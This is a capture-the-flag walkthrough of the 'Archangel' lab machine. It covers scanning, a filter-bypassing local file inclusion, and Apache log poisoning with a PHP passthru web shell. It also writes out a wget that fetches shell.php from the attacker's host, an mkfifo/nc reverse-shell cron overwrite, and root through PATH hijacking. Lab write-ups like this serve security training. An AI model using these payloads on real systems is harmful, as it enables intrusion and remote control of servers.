
!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

Path to accomplish the CTF:

- [ ] Flag 1: Hostname
- [ ] Flag 2: Exploiting LFI
- [ ] Flag 3: Initial Access
- [ ] Flag 4: User Flag
- [ ] Flag 5: Root Flag


## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```sh linenums="1" hl_lines="6 11"
    # Nmap 7.93 scan initiated Mon Feb 20 01:06:35 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.45.108
    Nmap scan report for 10.10.45.108
    Host is up (0.15s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
    |   256 637327c76104256a08707a36b2f2840d (ECDSA)
    |_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Wavefire
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=2/20%OT=22%CT=1%CU=35053%PV=Y%DS=5%DC=I%G=Y%TM=63F30E0
    OS:7%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS
    OS:=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M
    OS:505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4
    OS:B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
    OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
    OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
    OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
    OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
    OS:=40%CD=S)

    Network Distance: 5 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Mon Feb 20 01:07:03 2023 -- 1 IP address (1 host up) scanned in 27.88 seconds

  ```

## <b>Enumeration</b>

As a part of Enumeration, I began by scanning the website on port 80 and stumbled upon a `wavefire` template. But thankfully, this led me to the domain name {=="mafialive.thm"==}, which I added to my `/etc/hosts` file and accessed via the domain name.

``` sh linenums="1"
127.0.0.1 localhost
127.0.1.1 kali
10.10.180.241 team.thm
10.10.180.241 dev.team.thm
10.10.45.108 mafialive.thm
```

<img id="image1" />

Upon accessing the page, I discovered `flag-1`

- [x] Flag 1: Hostname
- [ ] Flag 2: Exploiting LFI
- [ ] Flag 3: Initial Access
- [ ] Flag 4: User Flag
- [ ] Flag 5: Root Flag

But there was nothing noteworthy beyond that. As a result, I executed the ```dirsearch``` script to locate hidden directories and files. Here, I discovered <b>/test.php</b> and accessed it.

``` sh linenums="1" hl_lines="31"
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/mafialive.thm/_23-02-21_09-38-53.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-02-21_09-38-53.log

Target: http://mafialive.thm/

[09:38:54] Starting: 
[09:38:59] 403 -  278B  - /.ht_wsr.txt                                     
[09:38:59] 403 -  278B  - /.htaccess.bak1
[09:38:59] 403 -  278B  - /.htaccess.sample
[09:38:59] 403 -  278B  - /.htaccess.orig
[09:38:59] 403 -  278B  - /.htaccess.save
[09:38:59] 403 -  278B  - /.htaccess_sc
[09:38:59] 403 -  278B  - /.htaccess_extra
[09:38:59] 403 -  278B  - /.htaccess_orig
[09:38:59] 403 -  278B  - /.htaccessBAK
[09:38:59] 403 -  278B  - /.htaccessOLD
[09:38:59] 403 -  278B  - /.htaccessOLD2
[09:38:59] 403 -  278B  - /.htm                                            
[09:38:59] 403 -  278B  - /.html
[09:38:59] 403 -  278B  - /.htpasswd_test
[09:38:59] 403 -  278B  - /.htpasswds
[09:38:59] 403 -  278B  - /.httr-oauth
[09:39:01] 403 -  278B  - /.php                                            
[09:39:34] 200 -   59B  - /index.html                                       
[09:39:46] 200 -   34B  - /robots.txt                                       
[09:39:47] 403 -  278B  - /server-status/                                   
[09:39:47] 403 -  278B  - /server-status                                    
[09:39:51] 200 -  286B  - /test.php                                         
                                                                             
Task Completed
```
This was quite interesting, because there was a button and when i clicked, it gave me a opportunity to explore on LFI (Local file Inclusion vulnerabilities)

<img id="image2" />

In attempting to access "`/etc/passwd`" via the URL {++http://mafialive.thm/test.php?view=/etc/passwd++}, I encountered some restrictions. To determine the parameters of access permissions, including those that were denied, I proceeded to review the source code.

I found this on web to encode the content as base64 and decode it back as php. 

!!! tip "LFI-PHP Base64 Encode/Decode"
    
    <p id="desc" style="font-size:15px">php://filter/convert.base64-encode/resource=file:///etc/passwd</p>


I proceeded to execute the following command: 

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=file:///var/www/html/development_testing/test.php 
```

<img id="image3" />

Upon decoding the result, I was able to successfully access the ```test.php``` file, and the source code appeared as follows. It seems that the flag-2 was hidden in the source code of the test.php file I accessed.

- [x] Flag 1: Hostname
- [x] Flag 2: Exploiting LFI
- [ ] Flag 3: Initial Access
- [ ] Flag 4: User Flag
- [ ] Flag 5: Root Flag

```html linenums="1" hl_lines="11 17"
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>
```

The restrictions placed on the "view" parameter are evident; specifically, the string {++var/www/html/development_testing++} was allowed, while any occurrence of ../.. was not permitted. Through reverse engineering, I found a way to bypass these limitations, resulting in the following modified command.

```sh
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd
```

That was working, and It gave me the results.

```sh linenums="1" hl_lines="26"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

## <b>Initial Access</b>

I saw an opportunity to explore further and decided to try a different file. In the context of Local File Inclusion (LFI), the remote files cannot be accessed, but it is possible to modify the contents of local files. This provided an opening to execute a straightforward PHP script on log files.

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log
```

The server is configured to use Apache, which usually stores its log files in the directory `/var/log/apache2/access.log.` By utilizing the PHP command: 

!!! tip "PHP Command Execution"
    
    <p id="desc" style="font-size:15px"><? passthru($_GET[cmd]) ?></p>


we could pass commands as an argument through ```cmd``` and successfully execute them.

<img id="image4" />

I though of a plan to download a reverse shell onto the server by utilizing the "cmd" argument. The command was structured as follows: 

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&cmd=wget%20%20http://10.17.3.217:8000/shell.php
```
!!! note 
    I had a local Python HTTP server beforehand.

<img id="image5" />

- [x] Flag 1: Hostname
- [x] Flag 2: Exploiting LFI
- [x] Flag 3: Initial Access
- [ ] Flag 4: User Flag
- [ ] Flag 5: Root Flag

Subsequently, I accessed 

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/shell.php
```
which enabled me to gain initial access. Using this access, I successfully located the flag-3 at "/home/archangel/user.txt"

<img id="image6" />

## <b>Privilege Escalation</b>

### <b>Gaining User access (Horizontal)</b>

Afterwards, I was able to escalate my privileges horizontally for the user ``archangel``. By running the ``linpeas.sh`` script, I discovered that there was a cron job running with the following configuration:

```sh
*/1 * * * * archangel /opt/helloworld.sh
```

This presented an opportunity to execute a reverse shell. To do so, I modified the code within the `helloworld.sh` file to include the following command:

```sh
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.3.217 5433" > /opt/helloworld.sh
```

As a result of this change, I was able to successfully execute a reverse shell and obtain the flag-4 located at 
~/secret/user2.txt

- [x] Flag 1: Hostname
- [x] Flag 2: Exploiting LFI
- [x] Flag 3: Initial Access
- [x] Flag 4: User Flag
- [ ] Flag 5: Root Flag

### <b>Gaining Root access (Vertical)</b>

Upon gaining access to the ```archangel``` account, I was keen to identify any binaries with SUID permissions since I lacked passwords for any of the users. Consequently, I ran the following command:

``` sh linenums="1" hl_lines="18"
find / -type f -perm -04000 -ls 2>/dev/null

392217     40 -rwsr-xr-x   1 root     root        40344 Mar 23  2019 /usr/bin/newgrp
396413     76 -rwsr-xr-x   1 root     root        75824 Mar 23  2019 /usr/bin/gpasswd
393011     76 -rwsr-xr-x   1 root     root        76496 Mar 23  2019 /usr/bin/chfn
395021     44 -rwsr-xr-x   1 root     root        44528 Mar 23  2019 /usr/bin/chsh
396417     60 -rwsr-xr-x   1 root     root        59640 Mar 23  2019 /usr/bin/passwd
406571     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
396823    148 -rwsr-xr-x   1 root     root       149080 Sep 23  2020 /usr/bin/sudo
392437     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
524345    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
396700     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
652899     28 -rwsr-xr-x   1 root     root          26696 Sep 17  2020 /bin/umount
652831     44 -rwsr-xr-x   1 root     root          44664 Mar 23  2019 /bin/su
652862     44 -rwsr-xr-x   1 root     root          43088 Sep 17  2020 /bin/mount
660690     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
652934     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
1053235     20 -rwsr-xr-x   1 root     root          16904 Nov 18  2020 /home/archangel/secret/

```

During the search, I noticed that the ```/home/archangel/secret/``` directory appeared suspicious. Further investigation revealed the presence of an `ELF binary` with the SUID bit set. I used the `strings` command to examine its content, which indicated that the binary was copying files using the following command:

``` sh
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

However, since the path did not exist, it was unlikely that the program would run successfully. To exploit this vulnerability, I created a `cp` binary file in the` /tmp` directory and added the path to it as follows:

``` sh
export PATH="/tmp:$PATH"
```

With this modification, I was able to execute the "cp" command with the SUID permissions and obtain a root shell.

- [x] Flag 1: Hostname
- [x] Flag 2: Exploiting LFI
- [x] Flag 3: Initial Access
- [x] Flag 4: User Flag
- [x] Flag 5: Root Flag

!!! success
    and from there, I had peace upon me! 
  
<script>

// JSON object
const data = {
    "desc": "Archangel -- Boot2root, Web exploitation, Privilege escalation, LFI",
    "ip":  "10.10.237.155 | 10.10.45.108 (used 2 Sessions)",
    "ports": "22/tcp,ssh,OpenSSH 7.6p1 Ubuntu;80/tcp,http,Apache httpd 2.4.29",
    "difficulty":"easy",
    "id": "2"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>